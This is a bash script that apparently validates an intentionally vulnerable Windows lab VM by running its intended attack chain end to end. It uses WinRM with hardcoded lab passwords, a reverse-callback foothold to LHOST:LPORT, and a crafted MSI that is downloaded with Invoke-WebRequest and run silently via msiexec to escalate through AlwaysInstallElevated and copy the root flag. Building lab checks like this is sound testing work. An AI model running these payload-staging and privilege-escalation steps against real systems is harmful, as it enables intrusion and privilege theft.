#!/usr/bin/env bash
set -uo pipefail

# End-to-end CysVuln chain validation (config smoke + EFS foothold + AIE privesc).
#
# Usage:
#   ./scripts/validate-cysvuln-chain.sh [target-ip]
#
# Environment (local QEMU defaults):
#   CYSVULN_HTTP_PORT=18080   forwarded guest :80
#   WINRM_PORT=15985          forwarded guest :5985
#   CYSVULN_RDP_PORT=13389    forwarded guest :3389
#   CYSVULN_SKIP_EFS=1        skip EFS foothold; use interactive Joe path only
#   CYSVULN_AIE_FALLBACK=joe  when EFS fails, run interactive Joe AIE (default: joe)
#   LHOST=10.0.2.2            QEMU user-net gateway (guest -> host)
#   LPORT=4444
#   VALIDATION_LOG            output log path

TARGET="${1:-127.0.0.1}"
HTTP_PORT="${CYSVULN_HTTP_PORT:-18080}"
WINRM_PORT="${WINRM_PORT:-15985}"
RDP_PORT="${CYSVULN_RDP_PORT:-13389}"
LHOST="${LHOST:-10.0.2.2}"
LPORT="${LPORT:-4444}"
MSI_LOCAL="${MSI_LOCAL:-/tmp/aie-probe.msi}"
HTTP_SERVE_PORT="${HTTP_SERVE_PORT:-8888}"
VALIDATION_LOG="${VALIDATION_LOG:-artifacts/cysvuln/validation-chain.log}"
ADMIN_PW="${ADMIN_PW:-PizzaMan123!}"
JOE_PW="${JOE_PW:-VeryStrongPassword123!@#}"
SKIP_EFS="${CYSVULN_SKIP_EFS:-0}"
AIE_FALLBACK="${CYSVULN_AIE_FALLBACK:-joe}"

mkdir -p "$(dirname "$VALIDATION_LOG")"
exec > >(tee -a "$VALIDATION_LOG") 2>&1
echo "[*] validation log: $VALIDATION_LOG"
echo "[*] started: $(date -Is)"
echo "[*] CYSVULN_SKIP_EFS=$SKIP_EFS CYSVULN_AIE_FALLBACK=$AIE_FALLBACK"

if ! python3 -c "import winrm" 2>/dev/null; then
    echo "[!] run inside: nix develop" >&2
    exit 2
fi

PASS=0
FAIL=0

step() {
    echo
    echo "===== $1 ====="
}

ok() { echo "[+] PASS: $1"; PASS=$((PASS + 1)); }
bad() { echo "[!] FAIL: $1" >&2; FAIL=$((FAIL + 1)); }

step "prep"
if WINRM_PORT="$WINRM_PORT" CYSVULN_HTTP_PORT="$HTTP_PORT" ./scripts/cysvuln-local-prep.sh "$TARGET"; then
    ok "local prep"
else
    bad "local prep"
fi

step "smoke"
if WINRM_PORT="$WINRM_PORT" ./scripts/verify-cysvuln.sh "$TARGET"; then
    ok "verify-cysvuln"
else
    bad "verify-cysvuln"
fi

step "audit aie (User_Joe hive)"
if python3 scripts/validate/audit_aie.py \
    --target "$TARGET" --port "$WINRM_PORT" \
    --user Administrator --password "$ADMIN_PW" \
    --profile-user User_Joe; then
    ok "audit_aie"
else
    bad "audit_aie"
fi

AIE_OK=0

run_joe_interactive_aie() {
    step "AIE via interactive User_Joe (known creds)"
    python3 - "$TARGET" "$WINRM_PORT" "$ADMIN_PW" <<'PY'
import sys, winrm
host, port, pw = sys.argv[1:4]
s = winrm.Session(f"http://{host}:{port}/wsman", auth=("Administrator", pw), transport="ntlm")
r = s.run_ps("Remove-Item 'C:\\Users\\Public\\aie-flag.txt' -Force -EA SilentlyContinue")
sys.exit(0 if r.status_code == 0 else 1)
PY
    if python3 scripts/validate/run_aie_as_joe_interactive.py \
        --target "$TARGET" --winrm-port "$WINRM_PORT" --rdp-port "$RDP_PORT" \
        --admin-password "$ADMIN_PW" --joe-password "$JOE_PW"; then
        ok "AIE via interactive User_Joe"
        return 0
    fi
    bad "AIE via interactive User_Joe"
    return 1
}

if [ "$SKIP_EFS" = "1" ]; then
    if run_joe_interactive_aie; then AIE_OK=1; fi
else
    step "generate + stage MSI"
    python3 scripts/validate/check_aie_response.py \
        --command 'copy C:\Users\Administrator\Desktop\root.txt C:\Users\Public\aie-flag.txt' \
        --out "$MSI_LOCAL"

    python3 -m http.server "$HTTP_SERVE_PORT" --directory "$(dirname "$MSI_LOCAL")" &
    HTTP_PID=$!
    sleep 1

    python3 - "$TARGET" "$WINRM_PORT" "$HTTP_SERVE_PORT" "$(basename "$MSI_LOCAL")" <<'PY'
import sys, winrm
host, port, serve_port, msi_name = sys.argv[1:5]
s = winrm.Session(f"http://{host}:{port}/wsman", auth=("Administrator", "PizzaMan123!"), transport="ntlm")
ps = f"""
Invoke-WebRequest -Uri 'http://10.0.2.2:{serve_port}/{msi_name}' -OutFile 'C:\\Users\\Public\\aie-probe.msi' -UseBasicParsing
@'
@echo off
msiexec /quiet /norestart /i C:\\Users\\Public\\aie-validation-payload.msi /l*v C:\\Users\\Public\\aie-joe-validation.log
'@ | Set-Content -Path 'C:\\Users\\Public\\aie-run.cmd' -Encoding ASCII
Write-Host (Get-Item 'C:\\Users\\Public\\aie-probe.msi').Length
Write-Host (Get-Item 'C:\\Users\\Public\\aie-run.cmd').Length
"""
r = s.run_ps(ps)
print(r.std_out.decode(errors="replace").strip())
sys.exit(0 if r.status_code == 0 else 1)
PY

    if [ $? -eq 0 ]; then
        ok "MSI staged on guest"
    else
        bad "MSI staging"
    fi

    kill "$HTTP_PID" 2>/dev/null || true

    step "AIE privesc via EFS callback (User_Joe interactive msiexec)"
    python3 - "$TARGET" "$WINRM_PORT" "$ADMIN_PW" <<'PY'
import sys, winrm
host, port, pw = sys.argv[1:4]
s = winrm.Session(f"http://{host}:{port}/wsman", auth=("Administrator", pw), transport="ntlm")
r = s.run_ps("Remove-Item 'C:\\Users\\Public\\aie-flag.txt','C:\\Users\\Public\\aie-joe-validation.log' -Force -EA SilentlyContinue")
sys.exit(0 if r.status_code == 0 else 1)
PY

    if python3 scripts/validate/run_aie_via_efs_callback.py \
        --target "$TARGET" --port "$HTTP_PORT" --service-port 80 --winrm-port "$WINRM_PORT" \
        --admin-password "$ADMIN_PW" \
        --msi 'C:\Users\Public\aie-validation-payload.msi' \
        --lhost "$LHOST" --lport "$LPORT" \
        --callback-wait 45 --msi-wait 45 --retries 1; then
        ok "AIE via EFS (callback or exec stager)"
        AIE_OK=1
    elif [ "$AIE_FALLBACK" = "joe" ]; then
        echo "[*] EFS path incomplete; falling back to interactive User_Joe..."
        if run_joe_interactive_aie; then AIE_OK=1; fi
    else
        bad "AIE via EFS callback"
    fi
fi

step "root flag cross-check"
if [ "$AIE_OK" -eq 0 ]; then
    bad "root flag cross-check (skipped: AIE failed)"
else
python3 - "$TARGET" "$WINRM_PORT" "$ADMIN_PW" <<'PY'
import sys, winrm
host, port, pw = sys.argv[1:4]
s = winrm.Session(f"http://{host}:{port}/wsman", auth=("Administrator", pw), transport="ntlm")
ps = r"""
$aie = Get-Content 'C:\Users\Public\aie-flag.txt' -Raw -EA SilentlyContinue
$root = Get-Content 'C:\Users\Administrator\Desktop\root.txt' -Raw -EA SilentlyContinue
if (-not $aie -or -not $root) { exit 1 }
Write-Host "aie-flag:" $aie.Trim()
Write-Host "root.txt:" $root.Trim()
if ($aie.Trim() -eq $root.Trim()) { exit 0 } else { exit 2 }
"""
r = s.run_ps(ps)
print(r.std_out.decode(errors="replace").strip())
sys.exit(r.status_code)
PY

case $? in
    0) ok "root flag matches aie-flag.txt" ;;
    *) bad "root flag cross-check" ;;
esac
fi

echo
echo "===== validate-cysvuln-chain ====="
echo "  $PASS pass / $FAIL fail"
echo "  finished: $(date -Is)"
echo "================================"
[ "$FAIL" -eq 0 ]
